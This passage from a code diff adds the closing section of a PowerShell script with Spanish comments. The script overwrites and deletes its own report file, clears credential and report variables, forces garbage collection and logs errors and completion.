+            [System.IO.File]::WriteAllBytes($reportPath, $buffer)
+            Remove-Item $reportPath -Force
+        }
+        
+        # Limpiar variables
+        $creds = $null
+        $report = $null
+        [System.GC]::Collect()
+    }
+    catch {
+        Write-Log "Error en limpieza final: $_" -Level "DEBUG"
+    }
+}
+catch {
+    Write-Log "Error crítico: $_" -Level "ERROR"
+}
+finally {
+    Write-Log "Ejecución finalizada" -Level "INFO"
+}
